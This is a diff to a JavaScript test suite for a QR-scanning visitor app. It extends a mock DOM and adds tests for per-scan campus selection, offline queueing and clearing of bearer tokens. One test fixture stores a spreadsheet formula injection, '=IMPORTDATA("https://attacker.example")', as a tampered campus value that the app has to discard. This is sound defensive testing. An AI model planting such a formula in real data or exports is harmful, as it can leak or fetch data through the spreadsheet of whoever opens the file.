@@ -17,20 +17,38 @@ function createElement(tagName, innerHTMLWrites) {
     id: '',
     textContent: '',
     disabled: false,
+    hidden: false,
+    attributes: {},
     classList: {
-      add(className) {
+      add(...classNames) {
         const classes = new Set(element.className.split(/\s+/).filter(Boolean));
-        classes.add(className);
+        classNames.forEach(className => classes.add(className));
         element.className = [...classes].join(' ');
       },
-      remove(className) {
+      remove(...classNames) {
         element.className = element.className
           .split(/\s+/)
-          .filter(value => value && value !== className)
+          .filter(value => value && !classNames.includes(value))
           .join(' ');
+      },
+      contains(className) {
+        return element.className.split(/\s+/).filter(Boolean).includes(className);
       }
     },
-    addEventListener() {},
+    setAttribute(name, value) {
+      this.attributes[name] = String(value);
+    },
+    getAttribute(name) {
+      return Object.prototype.hasOwnProperty.call(this.attributes, name) ? this.attributes[name] : null;
+    },
+    removeAttribute(name) {
+      delete this.attributes[name];
+    },
+    addEventListener(eventName, handler) {
+      element.listeners = element.listeners || {};
+      element.listeners[eventName] = element.listeners[eventName] || [];
+      element.listeners[eventName].push(handler);
+    },
     appendChild(child) {
       this.children.push(child);
       return child;
@@ -356,4 +374,167 @@ test('keeps network failures pending without logging credentials', async () => {
     false,
     'network error leaked the token to logs'
   );
+});
+
+// --- Campus Intent Capture ---
+
+const CONFIGURED_SEARCH = '?uni=ieu';
+const CONFIGURED_OPTIONS = ['Madrid', 'Segovia', 'Undecided'];
+
+test('unconfigured participant keeps the existing fast scanning flow with no campus selector', () => {
+  const harness = createHarness({ online: true });
+  assert.equal(harness.elements.has('campus-selector'), false);
+  assert.equal(harness.elements.has('campus-options'), false);
+
+  harness.context.onScanSuccess('A1B2C3D4');
+  assert.equal(harness.queue().length, 1);
+  assert.equal(harness.queue()[0].campus, '');
+});
+
+test('configured participant sees a campus selector with every configured option plus Undecided', () => {
+  const harness = createHarness({ search: CONFIGURED_SEARCH, online: true });
+  const selector = harness.elements.get('campus-selector');
+  assert.equal(selector.hidden, false);
+
+  const optionButtons = harness.elements.get('campus-options').children;
+  assert.deepEqual(optionButtons.map(button => button.textContent), CONFIGURED_OPTIONS);
+  assert.equal(optionButtons[optionButtons.length - 1].textContent, 'Undecided');
+});
+
+test('configured institution cannot create a new queue item without a campus selection', () => {
+  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
+  harness.context.onScanSuccess('A1B2C3D4');
+  assert.deepEqual(harness.queue(), []);
+});
+
+test('selecting a campus allows a scan and attaches it to the queued item', () => {
+  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
+  harness.context.selectCampus('Segovia');
+  harness.context.onScanSuccess('A1B2C3D4');
+  assert.equal(harness.queue().length, 1);
+  assert.equal(harness.queue()[0].campus, 'Segovia');
+});
+
+test('campus resets after a successful capture and must be reselected for the next visitor', () => {
+  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
+  harness.context.selectCampus('Madrid');
+  harness.context.onScanSuccess('A1B2C3D4');
+  assert.equal(harness.queue().length, 1);
+
+  // No reselection before the next visitor's QR: it must be gated again.
+  harness.context.onScanSuccess('E5F6G7H8');
+  assert.equal(harness.queue().length, 1);
+});
+
+test('campus resets after a local duplicate is detected', () => {
+  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
+  harness.context.selectCampus('Madrid');
+  harness.context.onScanSuccess('A1B2C3D4');
+  harness.context.onScanSuccess('A1B2C3D4'); // local duplicate, no second row
+  assert.equal(harness.queue().length, 1);
+
+  // Campus selection must not have survived the duplicate for the next visitor.
+  harness.context.onScanSuccess('E5F6G7H8');
+  assert.equal(harness.queue().length, 1);
+});
+
+test('an invalid-format QR does not consume the selected campus', () => {
+  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
+  harness.context.selectCampus('Madrid');
+  harness.context.onScanSuccess('=1+1'); // invalid format, ignored
+  harness.context.onScanSuccess('A1B2C3D4'); // same visitor's correct QR
+  assert.equal(harness.queue().length, 1);
+  assert.equal(harness.queue()[0].campus, 'Madrid');
+});
+
+test('offline scans retain their own campus and several visitors can differ', () => {
+  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
+  harness.context.selectCampus('Madrid');
+  harness.context.onScanSuccess('A1B2C3D4');
+  harness.context.selectCampus('Segovia');
+  harness.context.onScanSuccess('E5F6G7H8');
+  harness.context.selectCampus('Undecided');
+  harness.context.onScanSuccess('11112222');
+
+  const queue = harness.queue();
+  assert.equal(queue.length, 3);
+  assert.deepEqual(queue.map(scan => scan.campus), ['Madrid', 'Segovia', 'Undecided']);
+});
+
+test('later UI selections do not mutate an earlier queued scan', () => {
+  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
+  harness.context.selectCampus('Madrid');
+  harness.context.onScanSuccess('A1B2C3D4');
+  harness.context.selectCampus('Segovia'); // selection changes after capture
+
+  assert.equal(harness.queue()[0].campus, 'Madrid');
+});
+
+test('sync payload sends the campus belonging to each queued scan', async () => {
+  const harness = createHarness({ search: CONFIGURED_SEARCH, online: true });
+  harness.context.selectCampus('Segovia');
+  harness.context.onScanSuccess('A1B2C3D4');
+  await harness.flushPromises();
+
+  assert.equal(harness.fetchCalls.length, 1);
+  const body = new URLSearchParams(harness.fetchCalls[0].options.body);
+  assert.equal(body.get('campus'), 'Segovia');
+});
+
+test('unconfigured participant syncs with an empty campus field', async () => {
+  const harness = createHarness({ online: true });
+  harness.context.onScanSuccess('A1B2C3D4');
+  await harness.flushPromises();
+
+  const body = new URLSearchParams(harness.fetchCalls[0].options.body);
+  assert.equal(body.get('campus'), '');
+});
+
+test('legacy local queue objects without a campus field normalize safely', () => {
+  const harness = createHarness({
+    search: CONFIGURED_SEARCH,
+    initialQueue: [{
+      id: 'legacy-scan',
+      participantId: 'ieu',
+      token: VALID_TOKEN,
+      uuid: 'A1B2C3D4',
+      timestamp: '2026-07-27T12:00:00.000Z',
+      status: 'pending'
+    }]
+  });
+
+  assert.equal(harness.queue()[0].campus, '');
+  assert.equal(harness.queue()[0].uuid, 'A1B2C3D4');
+});
+
+test('a stored campus value outside the participant allowlist is discarded on load', () => {
+  const harness = createHarness({
+    search: CONFIGURED_SEARCH,
+    initialQueue: [{
+      id: 'tampered-scan',
+      participantId: 'ieu',
+      token: VALID_TOKEN,
+      uuid: 'A1B2C3D4',
+      campus: '=IMPORTDATA("https://attacker.example")',
+      timestamp: '2026-07-27T12:00:00.000Z',
+      status: 'pending'
+    }]
+  });
+
+  assert.equal(harness.queue()[0].campus, '');
+});
+
+test('synced and rejected campus-enabled scans still clear the bearer credential', async () => {
+  const harness = createHarness({
+    search: CONFIGURED_SEARCH,
+    online: true,
+    fetchResponses: [{ result: 'error', code: 'invalid_ticket' }]
+  });
+  harness.context.selectCampus('Madrid');
+  harness.context.onScanSuccess('A1B2C3D4');
+  await harness.flushPromises();
+
+  assert.equal(harness.queue()[0].status, 'rejected');
+  assert.equal(harness.queue()[0].token, '');
+  assert.equal(harness.queue()[0].campus, 'Madrid');
 });
